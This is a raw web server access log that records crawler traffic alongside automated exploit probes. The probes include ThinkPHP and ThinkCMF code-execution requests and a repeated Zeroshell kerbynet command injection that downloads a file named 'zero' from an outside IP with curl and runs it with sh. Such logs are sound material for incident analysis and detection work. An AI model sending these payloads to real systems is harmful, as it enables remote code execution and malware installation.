::ffff:127.0.0.1 - - [06/Aug/2020:05:21:34 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [06/Aug/2020:05:25:43 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
::ffff:127.0.0.1 - - [06/Aug/2020:05:36:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 60190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:02 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:02 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:02 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:02 +0000] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 180 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 180 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET / HTTP/1.1" 200 60190 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 180 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:42:03 +0000] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 180 "-" "AWS Security Scanner"
::ffff:127.0.0.1 - - [06/Aug/2020:05:51:02 +0000] "GET /web_assets/assets/img/green-img/icon-green-11.png HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [06/Aug/2020:05:59:33 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 60190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [06/Aug/2020:06:03:18 +0000] "GET /insurance/1 HTTP/1.1" 200 157121 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [06/Aug/2020:06:06:15 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [06/Aug/2020:06:21:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:28 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:28 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:28 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:29 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:29 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:29 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:29 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:29 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:30 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:30 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:30 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:30 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:31 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:15:31 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.1" 404 155 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:38:03 +0000] "GET / HTTP/1.1" 200 60190 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:07:38:04 +0000] "GET /contact HTTP/1.1" 200 39599 "-" "-"
::ffff:127.0.0.1 - - [06/Aug/2020:08:04:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [06/Aug/2020:08:06:08 +0000] "GET /carrier-info HTTP/1.1" 200 223630 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
